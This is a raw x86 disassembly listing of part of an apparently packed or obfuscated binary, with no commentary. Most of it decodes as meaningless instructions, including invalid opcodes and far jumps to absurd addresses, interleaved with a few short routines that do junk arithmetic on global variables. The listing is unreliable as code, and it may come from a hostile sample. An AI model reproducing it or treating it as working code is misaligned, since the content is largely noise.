  406160:	sub    esp,DWORD PTR [edi+0x26]
  406163:	out    dx,al
  406164:	add    cl,al
  406166:	sbb    dh,bl
  406168:	push   eax
  406169:	and    ecx,ebx
  40616b:	iret   
  40616c:	push   es
  40616d:	test   al,0xc
  40616f:	in     eax,dx
  406170:	push   0x4f
  406172:	jmp    0x590687e0
  406177:	shl    BYTE PTR [ebx-0x282850f7],cl
  40617d:	cld    
  40617e:	in     eax,0xd3
  406180:	lahf   
  406181:	cmc    
  406182:	int3   
  406183:	pop    ebp
  406184:	xchg   edi,eax
  406185:	mov    ch,0xb6
  406187:	sub    eax,0xc44eb18c
  40618c:	jmp    0x406112
  40618e:	cmp    ch,bl
  406190:	add    eax,0xc296df9a
  406195:	aam    0x2f
  406197:	(bad)  
  406198:	imul   edi
  40619a:	inc    eax
  40619b:	mov    esp,0x1a3a132
  4061a0:	mov    eax,0x19748150
  4061a5:	dec    eax
  4061a6:	loopne 0x406183
  4061a8:	jge    0x4061a0
  4061aa:	jecxz  0x406173
  4061ac:	push   ss
  4061ad:	or     cl,BYTE PTR [esp+eiz*2]
  4061b0:	cmp    edi,DWORD PTR [edx-0x52]
  4061b3:	out    dx,al
  4061b4:	add    DWORD PTR [ebx+0x3a4fe0da],0x208f54ce
  4061be:	cdq    
  4061bf:	push   ds
  4061c0:	sbb    DWORD PTR [edi],ecx
  4061c2:	push   ebp
  4061c3:	jbe    0x4061d7
  4061c5:	das    
  4061c6:	inc    ebx
  4061c7:	scas   eax,DWORD PTR es:[edi]
  4061c8:	and    BYTE PTR [esi+0x1235cba1],ch
  4061ce:	retf   
  4061cf:	inc    ebp
  4061d0:	inc    DWORD PTR [edi-0x5c]
  4061d3:	jp     0x406223
  4061d5:	push   ds
  4061d6:	pop    edx
  4061d7:	jne    0x4061fd
  4061d9:	std    
  4061da:	push   ecx
  4061db:	dec    ebx
  4061dc:	mov    al,0x4d
  4061de:	mov    ds:0xe9ab4491,al
  4061e3:	(bad)  
  4061e4:	pop    edx
  4061e5:	adc    BYTE PTR [ebp+0x69d30a32],ah
  4061eb:	and    dh,0xbd
  4061ee:	jl     0x40619e
  4061f0:	loopne 0x40626e
  4061f2:	pop    ss
  4061f3:	mov    eax,0xff465922
  4061f8:	pop    es
  4061f9:	stos   DWORD PTR es:[edi],eax
  4061fa:	ret    0x37ff
  4061fd:	or     bh,ch
  4061ff:	lock mov esi,0xeb630017
  406205:	jge    0x406263
  406207:	lods   al,BYTE PTR ds:[esi]
  406208:	sar    BYTE PTR [edx],cl
  40620a:	(bad)  
  40620c:	pop    ds
  40620d:	outs   dx,BYTE PTR ds:[esi]
  40620e:	or     al,0xe
  406210:	pop    DWORD PTR [ebx+edx*1+0x69]
  406214:	sar    DWORD PTR [edi-0x6622b2cf],cl
  40621a:	cwde   
  40621b:	sbb    ah,BYTE PTR [eax-0x6b]
  40621e:	call   0xae712f8
  406223:	repz je 0x40625c
  406226:	inc    ebp
  406227:	xchg   sp,ax
  406229:	in     al,0x74
  40622b:	lods   eax,DWORD PTR ds:[esi]
  40622c:	mov    BYTE PTR [ecx+0x14a2450b],ah
  406232:	fdiv   DWORD PTR [edx]
  406234:	sub    DWORD PTR [edx],ebx
  406236:	cmp    eax,0x5f9eb697
  40623b:	mov    esi,0x6e664b6a
  406240:	cmp    DWORD PTR [eax-0x51a78e30],ebp
  406246:	add    edx,esp
  406248:	call   0x2253:0x680906c8
  40624f:	dec    esp
  406250:	pop    ds
  406251:	sub    bl,BYTE PTR [eax+0x42]
  406254:	xchg   esp,eax
  406255:	int3   
  406256:	aaa    
  406257:	sbb    edi,DWORD PTR [ebx*1-0x7916144a]
  40625e:	adc    al,0xa1
  406260:	or     ch,bh
  406262:	stos   BYTE PTR es:[edi],al
  406263:	ret    0x1763
  406266:	in     al,0xd1
  406268:	(bad)  
  406269:	(bad)  [edi+0x6d]
  40626c:	ds es jg 0x40629b
  406270:	repz pop esp
  406272:	xchg   DWORD PTR [eax+0x68],esp
  406275:	nop
  406276:	or     DWORD PTR ds:0xe6963e8f,0x45
  40627d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40627e:	pop    ebp
  40627f:	cmp    bl,BYTE PTR [eax]
  406281:	sbb    BYTE PTR [ebp-0x6a],al
  406284:	mov    ecx,0x1af3d39a
  406289:	in     al,0x66
  40628b:	das    
  40628c:	jge    0x406285
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	test   eax,0x8c0d8928
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4063a7
  40633b:	jle    0x406353
  40633d:	sbb    DWORD PTR [ebp-0x66],0x20
  406341:	push   esi
  406342:	xchg   ebx,eax
  406343:	ret    0x215e
  406346:	pushw  ss
  406348:	call   0xffd:0xb8bb42ff
  40634f:	jno    0x406376
  406351:	aam    0x5e
  406353:	scas   eax,DWORD PTR es:[edi]
  406354:	iret   
  406355:	mov    dh,0x7c
  406357:	mov    bl,0xe6
  406359:	xchg   esp,eax
  40635a:	push   ds
  40635b:	pop    ebx
  40635c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40635d:	push   ecx
  40635e:	jecxz  0x40631b
  406360:	in     al,0xf7
  406362:	mov    dh,0x24
  406364:	imul   DWORD PTR [edx]
  406366:	in     al,dx
  406367:	cli    
  406368:	neg    BYTE PTR [esi-0x62]
  40636b:	hlt    
  40636c:	mov    bh,BYTE PTR [edi+0x9f365fe]
  406372:	cmc    
  406373:	xchg   edx,eax
  406374:	retf   
  406375:	aam    0xd6
  406377:	inc    esp
  406378:	nop
  406379:	mov    cs,WORD PTR ds:0xc004c052
  40637f:	and    esi,DWORD PTR [esi+0x5b]
  406382:	adc    bh,BYTE PTR [ebx]
  406384:	addr16 mov ds:0x1996,al
  406388:	mov    al,0x97
  40638a:	leave  
  40638b:	lea    edi,[esi]
  40638d:	hlt    
  40638e:	popa   
  40638f:	adc    eax,0xd357d4dd
  406394:	fwait
  406395:	xchg   ebp,eax
  406396:	fistp  DWORD PTR [edi]
  406398:	ins    DWORD PTR es:[edi],dx
  406399:	sbb    edx,DWORD PTR [ecx+0x27]
  40639c:	aad    0x95
  40639e:	(bad)  
  40639f:	adc    ecx,DWORD PTR [eax+0x3b]
  4063a2:	ins    DWORD PTR es:[edi],dx
  4063a3:	arpl   dx,cx
  4063a5:	fdiv   QWORD PTR [esi+eax*1]
  4063a8:	pop    ecx
  4063a9:	popa   
  4063aa:	test   eax,0x9f3b0032
  4063af:	and    BYTE PTR [eax-0x1b],dh
  4063b2:	push   es
  4063b3:	cmp    edi,ecx
  4063b5:	mov    ebx,0x957e9a52
  4063ba:	mov    ah,0x39
  4063bc:	in     eax,0x28
  4063be:	into   
  4063bf:	jmp    0x40642b
  4063c1:	sub    al,0x7b
  4063c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c4:	stos   DWORD PTR es:[edi],eax
  4063c5:	or     DWORD PTR [ebx+0x72fb027e],ebp
  4063cb:	cld    
  4063cc:	adc    bh,ch
  4063ce:	or     BYTE PTR [ecx+0x5435f413],0xeb
  4063d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063d6:	shr    DWORD PTR cs:[edi],0x5f
  4063da:	xor    esp,ecx
  4063dc:	jmp    0x9502:0x9aa93c35
  4063e3:	scas   al,BYTE PTR es:[edi]
  4063e4:	inc    edx
  4063e5:	je     0x406398
  4063e7:	jp     0x40640c
  4063e9:	push   esp
  4063ea:	cdq    
  4063eb:	or     eax,DWORD PTR [edi-0x2f3b3f7c]
  4063f1:	lds    esi,FWORD PTR [eax+0x3dc1d36]
  4063f7:	test   al,0xe8
  4063f9:	cli    
  4063fa:	inc    edi
  4063fb:	sti    
  4063fc:	jnp    0x4063f7
  4063fe:	cmc    
  4063ff:	push   esi
  406400:	pop    ss
  406401:	sub    BYTE PTR [ebx],dh
  406403:	shl    DWORD PTR [esi+0x8],cl
  406406:	(bad)  
  406407:	dec    eax
  406408:	inc    eax
  406409:	adc    eax,0x9eadcb44
  40640e:	inc    ecx
  40640f:	sub    BYTE PTR ds:[edi+0x21ea696],cl
  406416:	fimul  DWORD PTR [eax+0x1da46ec6]
  40641c:	jmp    0x778c:0x87e8822d
  406423:	aam    0x5d
  406425:	bound  edx,QWORD PTR [ebp+0x4caa305b]
  40642b:	pop    ebx
  40642c:	clc    
  40642d:	loopne 0x4063b3
  40642f:	pop    ds
  406430:	jge    0x4063e2
  406432:	xchg   esp,eax
  406433:	inc    ebx
  406434:	mov    eax,DWORD PTR [eax+0x11463ec2]
  40643a:	ins    BYTE PTR es:[edi],dx
  40643b:	pop    esi
  40643c:	outs   dx,BYTE PTR ds:[esi]
  40643d:	inc    esp
  40643e:	push   es
  40643f:	jle    0x4063e8
  406441:	pop    es
  406442:	xchg   ebp,eax
  406443:	pop    edx
  406444:	imul   edi,DWORD PTR [eax+0x4873582f],0x4396b507
  40644e:	pop    esp
  40644f:	and    BYTE PTR [edi],ch
  406451:	cmp    eax,0xc1aaaf6f
  406456:	jl     0x4064c0
  406458:	pop    ss
  406459:	js     0x40642f
  40645b:	xlat   BYTE PTR ds:[ebx]
  40645c:	add    eax,0x4ce17f6
  406461:	inc    ecx
  406462:	imul   ebx,edi,0xb021312f
  406468:	retf   0xc8eb
  40646b:	sub    al,0xda
  40646d:	outs   dx,DWORD PTR ds:[esi]
  40646e:	std    
  40646f:	into   
  406470:	mov    bh,0x3f
  406472:	push   edx
  406473:	fst    DWORD PTR [edx+esi*1]
  406476:	outs   dx,BYTE PTR ds:[esi]
  406477:	inc    edi
  406479:	std    
  40647a:	shl    BYTE PTR [edi+0x58713616],0x71
  406481:	in     eax,0xbd
  406483:	mov    BYTE PTR [ebx],bh
  406485:	mov    eax,ds:0x5c46777a
  40648a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40648b:	in     eax,0x33
  40648d:	or     DWORD PTR [eax],esi
  40648f:	cld    
  406490:	movd   mm5,DWORD PTR [esi-0x589213e2]
  406497:	pop    esi
  406498:	mov    ah,dl
  40649a:	fwait
  40649b:	push   esp
  40649c:	jle    0x406462
  40649e:	inc    edx
  40649f:	lahf   
  4064a0:	imul   esi,DWORD PTR [edx+0x4dfc27b4],0x993af14d
  4064aa:	mov    ebx,0xecf23495
  4064af:	dec    esp
  4064b0:	imul   esi,DWORD PTR [edx+0x12afd7c3],0xcda38c14
  4064ba:	ret    
  4064bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064bc:	mov    ah,0x33
  4064be:	or     al,0xea
  4064c0:	sub    al,0x36
  4064c2:	pop    esp
  4064c3:	pop    eax
  4064c4:	xor    edi,DWORD PTR [edx]
  4064c6:	repnz rol BYTE PTR [edx],0x69
  4064ca:	jne    0x40652b
  4064cc:	or     al,0x6f
  4064ce:	sub    DWORD PTR [edi+ecx*4-0x62],esp
  4064d2:	push   0x37fd2ff1
  4064d7:	cmp    BYTE PTR [esp+edi*8+0x8d7dc1b],0xd4
  4064df:	mov    dh,0x25
  4064e1:	jmp    0x18:0xc2c95e2c
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	jb     0x4065d7
  406568:	mov    al,ds:0x703a3379
  40656d:	jo     0x406551
  40656f:	jle    0x4065e1
  406571:	jo     0x406500
  406573:	xchg   ecx,eax
  406574:	add    eax,0xe36d5cb2
  406579:	out    dx,eax
  40657a:	add    DWORD PTR [esi-0x1b5a132b],0xc7c1dd86
  406584:	and    ah,BYTE PTR [ebp-0x4a]
  406587:	ror    BYTE PTR [ebx-0x4],1
  40658a:	lahf   
  40658b:	stos   BYTE PTR es:[edi],al
  40658c:	icebp  
  40658d:	dec    ebp
  40658e:	and    DWORD PTR [ebp+0x5f],esp
  406591:	mov    dh,0x58
  406593:	cmp    ch,BYTE PTR [edx-0x3f]
  406596:	or     al,0xd3
  406598:	dec    ecx
  406599:	icebp  
  40659a:	daa    
  40659b:	mov    cl,0x1e
  40659d:	popf   
  40659e:	push   ebp
  40659f:	in     eax,dx
  4065a0:	xchg   esp,eax
  4065a1:	jmp    0x65cb5fe7
  4065a6:	mov    ss,WORD PTR [esp+eax*1]
  4065a9:	aaa    
  4065aa:	push   ecx
  4065ab:	in     eax,dx
  4065ac:	mov    eax,ds:0xcbca4959
  4065b1:	jb     0x406555
  4065b3:	mov    WORD PTR ds:0xc864396f,ds
  4065b9:	mov    bl,0x47
  4065bb:	scas   al,BYTE PTR es:[edi]
  4065bc:	mov    dh,BYTE PTR [edi+0x33]
  4065bf:	sbb    eax,0xd1c33c75
  4065c4:	(bad)  [edx-0x80]
  4065c7:	popa   
  4065c8:	(bad)  
  4065c9:	fwait
  4065ca:	xor    bl,0x92
  4065cd:	mov    ds:0x168618fe,al
  4065d2:	cmp    eax,0xabd08a93
  4065d7:	mov    DWORD PTR [esi-0x62],eax
  4065da:	aad    0x6f
  4065dc:	scas   al,BYTE PTR es:[edi]
  4065dd:	sbb    DWORD PTR [ecx],edi
  4065df:	leave  
  4065e0:	mov    edi,0xeee6d7af
  4065e5:	or     al,0xb6
  4065e7:	ds daa 
  4065e9:	adc    ah,dl
  4065eb:	std    
  4065ec:	clc    
  4065ed:	push   ss
  4065ee:	(bad)  
  4065ef:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065f1:	out    dx,eax
  4065f2:	cdq    
  4065f3:	xchg   BYTE PTR [esi-0x6df2112],dh
  4065f9:	push   esp
  4065fa:	mov    bh,0xc0
  4065fc:	inc    edx
  4065fd:	loope  0x406580
  4065ff:	add    eax,0x22ca4f6f
  406604:	jnp    0x40659e
  406606:	jne    0x406666
  406608:	stc    
  406609:	adc    al,0x22
  40660b:	retf   0x6405
  40660e:	add    eax,DWORD PTR [edi-0x34b54d6e]
  406614:	cmp    DWORD PTR [esi+0xbcb41de],ecx
  40661a:	mov    ecx,DWORD PTR [ebp+0x21]
  40661d:	and    DWORD PTR [edi+0x6591175d],esi
  406623:	(bad)  
  406624:	and    esp,DWORD PTR [edi+edx*4]
  406627:	retf   0x77d6
  40662a:	ins    DWORD PTR es:[edi],dx
  40662b:	and    al,0xb3
  40662d:	mul    DWORD PTR [esi-0x76]
  406630:	in     al,0x0
  406632:	xor    eax,0x2c82b680
  406637:	pop    esi
  406638:	inc    ebp
  406639:	mov    ecx,0x182a6c23
  40663e:	scas   al,BYTE PTR es:[edi]
  40663f:	push   0x34
  406641:	popf   
  406642:	sub    DWORD PTR [edi+0x5d],eax
  406645:	lods   eax,DWORD PTR ds:[esi]
  406646:	lods   al,BYTE PTR ds:[esi]
  406647:	test   edi,ebp
  406649:	xchg   ebx,eax
  40664a:	add    ecx,DWORD PTR [esi]
  40664c:	gs fwait
  40664e:	push   eax
  40664f:	push   edx
  406650:	ret    0x2479
  406653:	lock jp 0x4066b8
  406656:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406657:	ret    
  406658:	and    eax,0xd741a6fd
  40665d:	ss stos DWORD PTR es:[edi],eax
  40665f:	xchg   edx,eax
  406660:	jmp    0x7e97e16c
  406665:	and    bl,0xa9
  406668:	gs fs inc esp
  40666b:	adc    ebx,DWORD PTR [edx-0x772c67c2]
  406671:	std    
  406672:	sbb    eax,0x47186d1f
  406677:	mov    ebp,0x4ac0f50e
  40667c:	add    al,0x51
  40667e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40667f:	push   ecx
  406680:	in     eax,0xf1
  406682:	aad    0x82
  406684:	xchg   cl,al
  406686:	out    0xc,al
  406688:	shr    DWORD PTR ds:0x2eea37c5,cl
  40668e:	or     esi,ebp
  406690:	das    
  406691:	clc    
  406692:	(bad)  
  406693:	gs test eax,0x85316072
  406699:	cmp    al,0x54
  40669b:	or     DWORD PTR [edx+0x65],esi
  40669e:	bound  esp,QWORD PTR [ecx-0xc]
  4066a1:	mov    eax,0x5ffb1bb6
  4066a6:	stos   DWORD PTR es:[edi],eax
  4066a7:	fcomp  QWORD PTR [ebx+ecx*2+0x3f]
  4066ab:	mov    ah,0x60
  4066ad:	(bad)  
  4066ae:	loop   0x406698
  4066b0:	inc    ecx
  4066b1:	adc    BYTE PTR ds:0xf6974455,dh
  4066b7:	in     eax,dx
  4066b8:	js     0x4066fd
  4066ba:	bound  edi,QWORD PTR [ebp-0x3ee4f615]
  4066c0:	lds    ecx,FWORD PTR [ecx]
  4066c2:	ds mov edi,ecx
  4066c5:	daa    
  4066c6:	lea    esi,[ebp+0x34]
  4066c9:	jle    0x406698
  4066cb:	xchg   ecx,eax
  4066cc:	adc    al,0x18
  4066ce:	push   es
  4066cf:	or     BYTE PTR [edi+0x47],bl
  4066d2:	nop
  4066d3:	jmp    0x406728
  4066d5:	sub    DWORD PTR [esi-0x4183d7cb],0xedbd80bb
  4066df:	pop    ecx
  4066e0:	arpl   WORD PTR [edx+ebp*2+0x52],bx
  4066e4:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4066e6:	xor    dl,BYTE PTR [edx+0x6f20c85d]
  4066ec:	and    eax,0xa31ca5a4
  4066f1:	or     bh,BYTE PTR [esp+ecx*8]
  4066f4:	push   0xffffffde
  4066f6:	popf   
  4066f7:	mov    eax,ds:0x5af78d9c
  4066fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066fd:	jae    0x406744
  4066ff:	mov    ds:0x38bf9cdf,eax
  406704:	and    bl,0xe0
  406707:	fdivr  st,st(6)
  406709:	mov    esi,0x49bc8c78
  40670e:	icebp  
  40670f:	add    DWORD PTR [eax-0x20],edx
  406712:	inc    edi
  406713:	add    al,0xbe
  406715:	push   ds
  406716:	xchg   edx,eax
  406717:	shl    BYTE PTR [eax],1
  406719:	jns    0x406766
  40671b:	pop    ebx
  40671c:	add    esi,DWORD PTR ds:0x7575ab28
  406722:	jb     0x40674a
  406724:	mov    edx,0xded5e88a
  406729:	pop    ds
  40672a:	out    dx,eax
  40672b:	ror    BYTE PTR [edx+0x18bba160],1
  406731:	xchg   dl,al
  406733:	xchg   esp,eax
  406734:	dec    esp
  406735:	(bad)  gs:[edi+0x322c9325]
  40673c:	retf   
  40673d:	push   ecx
  40673e:	jmp    0x8474:0x7e8cb118
  406745:	test   eax,0x188f7ad
  40674a:	xchg   ecx,eax
  40674b:	cmp    BYTE PTR [edx-0xb],ah
  40674e:	xor    dl,BYTE PTR [edx-0x6a]
  406751:	and    eax,0x4f6b6d7a
  406756:	or     dh,BYTE PTR [edx+eiz*2-0x68]
  40675a:	cwde   
  40675b:	pop    es
  40675c:	mov    ah,0x64
  40675e:	int    0x4
  406760:	sahf   
  406761:	dec    edx
  406762:	loope  0x4067bf
  406764:	or     al,0xbc
  406766:	dec    edi
  406767:	popa   
  406768:	sahf   
  406769:	in     eax,0xc1
  40676b:	mov    cr6,eax
  40676e:	xchg   esp,eax
  40676f:	je     0x406705
  406771:	loope  0x4067b8
  406773:	out    dx,al
  406774:	adc    al,0x5d
  406776:	xor    DWORD PTR [eax-0xb55ce5f],esi
  40677c:	sbb    DWORD PTR [eax-0x4797d78a],ecx
  406782:	inc    edx
  406783:	mov    ah,0xf4
  406785:	out    0xa5,eax
  406787:	xor    dh,cl
  406789:	pop    ebx
  40678a:	cmp    BYTE PTR gs:[esp+ecx*4-0x33],0x4b
  406790:	retf   
  406791:	clc    
  406792:	mov    ebp,0x2e1e7ffa
  406797:	add    eax,0x9721f32d
  40679c:	sub    BYTE PTR [edi],al
  40679e:	shl    cl,0xbf
  4067a1:	sbb    al,0x3d
  4067a3:	xor    eax,0x77c91929
  4067a8:	pop    ds
  4067a9:	sbb    ebp,ecx
  4067ab:	sub    edi,DWORD PTR [ebx+0x9]
  4067ae:	jbe    0x406734
  4067b0:	sbb    DWORD PTR [eax],eax
  4067b2:	push   0xffffffaf
  4067b4:	scas   eax,DWORD PTR es:[edi]
  4067b5:	push   0x696964c9
  4067ba:	pop    eax
  4067bb:	and    ebp,DWORD PTR [edx]
  4067bd:	adc    edx,esi
  4067bf:	adc    DWORD PTR [esi+0x41],ecx
  4067c2:	dec    ebp
  4067c3:	neg    DWORD PTR [edi-0x31]
  4067c6:	inc    esp
  4067c7:	popa   
  4067c8:	pop    bp
  4067ca:	out    dx,eax
  4067cb:	push   edi
  4067cc:	popf   
  4067cd:	add    al,dl
  4067cf:	mov    ebx,DWORD PTR [ebx]
  4067d1:	cmp    eax,0x3634cf08
  4067d7:	mov    dl,0xee
  4067d9:	push   ecx
  4067da:	dec    edx
  4067db:	sub    ch,0x10
  4067de:	jmp    0x1095f2e6
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	sub    eax,esi
  406848:	rol    DWORD PTR [eax+0x707038a5],cl
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	adc    ebx,edi
  406854:	dec    ecx
  406855:	imul   edi,ebp,0xffffffb7
  406858:	jnp    0x406882
  40685a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40685b:	rcl    BYTE PTR [ebp+0x57cf91ba],1
  406861:	idiv   DWORD PTR [edx]
  406863:	push   ebx
  406864:	pop    ecx
  406865:	aad    0x53
  406867:	data16 ins BYTE PTR es:[edi],dx
  406869:	das    
  40686a:	or     eax,0x8f4f862c
  40686f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406870:	in     eax,dx
  406871:	gs push ecx
  406873:	scas   eax,DWORD PTR es:[edi]
  406874:	mov    eax,DWORD PTR [eax+esi*2]
  406877:	jmp    0xc5ba:0x6a8af3a5
  40687e:	add    al,0xe5
  406880:	pop    edi
  406881:	jb     0x406811
  406883:	jmp    0x406834
  406885:	cmp    eax,0x52dc2549
  40688a:	and    DWORD PTR [ecx],ecx
  40688c:	movzx  esi,BYTE PTR [eax-0x79aacfd0]
  406893:	add    eax,0x1e7352eb
  406898:	push   eax
  406899:	jge    0x406829
  40689b:	aaa    
  40689c:	ret    
  40689d:	sar    BYTE PTR [ebp-0x2340050d],cl
  4068a3:	es cmp eax,0x68409dda
  4068a9:	cmp    al,0x5f
  4068ab:	clc    
  4068ac:	and    BYTE PTR [ebx-0x129ce133],cl
  4068b2:	add    ch,BYTE PTR [eax-0x4]
  4068b5:	mov    esi,0xb6773fa5
  4068ba:	push   eax
  4068bb:	fimul  DWORD PTR [eax-0x3d]
  4068be:	fsubr  QWORD PTR [esi]
  4068c0:	idiv   BYTE PTR ds:0xf7390d6d
  4068c6:	jo     0x40686f
  4068c8:	fsub   QWORD PTR [eax+0x3319cb85]
  4068ce:	add    dl,BYTE PTR ds:0x1ebc950a
  4068d4:	dec    ebp
  4068d5:	inc    ecx
  4068d6:	ins    DWORD PTR es:[edi],dx
  4068d7:	ret    0x5faa
  4068da:	int3   
  4068db:	add    edx,DWORD PTR [eax+ebp*4+0x23]
  4068df:	push   ss
  4068e0:	dec    esp
  4068e1:	push   esp
  4068e2:	dec    ebp
  4068e3:	inc    esi
  4068e4:	push   ss
  4068e5:	jmp    0x406868
  4068e7:	mov    esp,0x2179337
  4068ec:	cmc    
  4068ed:	fidiv  DWORD PTR [esi+0x50ea44ce]
  4068f3:	mov    al,0xd2
  4068f5:	mov    WORD PTR [edi+0x6],cs
  4068f8:	push   eax
  4068f9:	das    
  4068fa:	and    ah,ah
  4068fc:	cmp    edi,ebx
  4068fe:	cwde   
  4068ff:	add    edi,esp
  406901:	ins    BYTE PTR es:[edi],dx
  406902:	dec    edi
  406903:	cmp    BYTE PTR [esi],al
  406905:	ret    
  406906:	cmp    eax,0x160f7714
  40690b:	mov    esp,0x4d4d014c
  406910:	adc    DWORD PTR [ebp+0x236631e0],0xe5491b2e
  40691a:	ret    
  40691b:	mov    edi,DWORD PTR [edi+0x3c0fe2e3]
  406921:	es xor DWORD PTR ds:[edi-0x2fbc8c1a],ebx
  406929:	sub    eax,0x92f72239
  40692e:	aad    0xb6
  406930:	call   DWORD PTR [ebp+ecx*4-0x61]
  406934:	pop    ebx
  406935:	xchg   BYTE PTR [edi+0x245a56b7],al
  40693b:	(bad)  
  40693d:	inc    edi
  40693e:	aaa    
  40693f:	inc    esi
  406940:	stc    
  406941:	pop    ebp
  406942:	ds jle 0x4068d1
  406945:	dec    edi
  406946:	inc    edi
  406947:	pop    ebx
  406948:	and    dl,dh
  40694a:	lods   eax,DWORD PTR ds:[esi]
  40694b:	mov    eax,ds:0x7b828d30
  406950:	mov    dl,0x46
  406952:	mov    edx,0xe330a6e9
  406957:	adc    eax,DWORD PTR [ebx+0x3f]
  40695a:	test   BYTE PTR ds:[eax],0xcf
  40695e:	cmp    eax,0x8364d63
  406963:	xchg   edi,eax
  406964:	jmp    0xc69a:0x4f7ed46c
  40696b:	(bad)  
  40696c:	push   edi
  40696d:	dec    ecx
  40696e:	adc    BYTE PTR [ecx+0x47],dl
  406971:	lods   al,BYTE PTR ds:[esi]
  406972:	and    DWORD PTR [edi-0x65],esp
  406975:	fldcw  WORD PTR [edi]
  406977:	mov    eax,ds:0xa7a818a9
  40697c:	nop
  40697d:	(bad)  
  40697f:	pusha  
  406980:	add    esp,DWORD PTR [ecx]
  406982:	mov    ds:0x759df9dd,eax
  406987:	inc    eax
  406988:	jb     0x406917
  40698a:	aaa    
  40698b:	out    dx,eax
  40698c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40698d:	sub    edi,DWORD PTR [eax-0x7260be91]
  406993:	inc    edi
  406994:	mov    edx,0xb82e4419
  406999:	mov    edx,ebp
  40699b:	ret    
  40699c:	xchg   esp,eax
